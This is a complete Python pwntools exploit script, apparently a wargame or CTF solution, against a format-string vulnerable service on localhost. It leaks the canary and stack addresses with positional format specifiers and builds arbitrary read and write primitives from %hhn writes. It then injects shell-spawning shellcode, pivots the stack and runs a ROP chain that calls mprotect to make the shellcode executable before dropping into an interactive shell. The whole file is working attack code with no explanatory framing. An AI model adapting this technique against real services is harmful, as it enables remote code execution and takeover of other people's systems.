#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

context(arch="i386", os="linux")

SHELLCODE = asm(shellcraft.findpeersh())

r = remote('localhost', 20002)
r.readline()

# Canary = %134$
# ebp (0xffd2da98) = %137$
# ret addr (0x56557d4b) = %138$
# socket = %139$

# fmt base (0x56557000) = ret_addr - 0xd4b
# buffer addr (0xffd2d86c) = ebp - 556
# addr of ret (0xffd2da7c) = ebp - 28

r.sendline(flat(
    '%134$08x', # Canary
    '%137$08x', # EBP1
    '%138$08x', # ret addr
    '%139$08x', # socket
    '%145$08x', # EBP2
    '%157$08x'  # EBP3
))

canary     = int(r.recv(8), 16)
ebp1       = int(r.recv(8), 16)
ret        = int(r.recv(8), 16)
socket     = int(r.recv(8), 16)
ebp2       = int(r.recv(8), 16)
ebp3       = int(r.recv(8), 16)
fmt_base   = ret - 0xd4b
buffer     = ebp1 - 556
ret_addr   = ebp1 - 28
r.recvline()

def send_receive(fmt):
    r.sendline(fmt)
    return r.recvline()

def make_pointer(addr):
    send_receive('A' * ((ebp2 & 0xff) + 0)   + '%137$hhn')
    send_receive('A' * ((addr >>  0) & 0xff) + '%145$hhn')

    send_receive('A' * ((ebp2 & 0xff) + 1)   + '%137$hhn')
    send_receive('A' * ((addr >>  8) & 0xff) + '%145$hhn')

    send_receive('A' * ((ebp2 & 0xff) + 2)   + '%137$hhn')
    send_receive('A' * ((addr >> 16) & 0xff) + '%145$hhn')

    send_receive('A' * ((ebp2 & 0xff) + 3)   + '%137$hhn')
    send_receive('A' * ((addr >> 24) & 0xff) + '%145$hhn')

def poke(addr, data):
    for i in range(len(data)):
        make_pointer(addr + i)
        send_receive('A' * data[i] + '%157$hhn')

def peek(addr):
    make_pointer(addr)
    r.sendline('%157$sTHE_END')
    return r.recvuntil('THE_END\n')[:-8] + b'\0'

PAGE_SIZE  = 0x1000
PAGE_MASK  = ~(PAGE_SIZE-1)
shellcode  = asm(shellcraft.findpeersh())
shellcode_addr = ebp3 + 4

add_esp_76 = fmt_base + 0x00000d13 # add esp, 0x44 ; pop ebx ; pop ebp ; ret
pop2       = fmt_base + 0x00000928 # pop ebx ; pop ebp ; ret
int_80     = fmt_base + 0x00000e88 # int 0x80 ; ret
pop_ebx    = fmt_base + 0x00000739 # pop ebx ; ret
pop_eax    = fmt_base + 0x00000d7b # pop eax ; ret
les_ecx    = fmt_base + 0x00000737 # les ecx, ptr [eax] ; pop ebx ; ret
lea_edx    = fmt_base + 0x00000a06 # lea edx, dword ptr [ebx - 0x110] ; mov dword ptr [esp], edx ; call eax


# Value to put into ecx:es
poke(fmt_base + 0x3000, p32(PAGE_SIZE) + b'\0\0')
# Gadget to pivot the stack
poke(ret_addr, p32(add_esp_76))
# Shellcode
poke(shellcode_addr, shellcode)

# ROP chain
# eax = SYS_mprotect
# ebx = shellcode addr
# ecx = len
# edx = PROT_READ | PROT_WRITE | PROT_EXEC
poke(ret_addr + 76 + 4, flat(
    #Put 7 into edx
    pop_ebx,
    (constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC) + 0x110,
    pop_eax,
    pop2,
    lea_edx,
    0xdeadbeef,

    #Put 4096 into ecx AND address to mprotect into ebx
    pop_eax, # pop eax ; ret
    fmt_base + 0x3000,  # ->eax
    les_ecx, # les ecx, ptr [eax] ; pop ebx ; ret
    shellcode_addr & PAGE_MASK, # address for mprotect must be on a page boundary

    pop_eax,
    int(constants.SYS_mprotect),
    int_80,
    shellcode_addr
    ))

r.sendline('exit')
r.interactive()
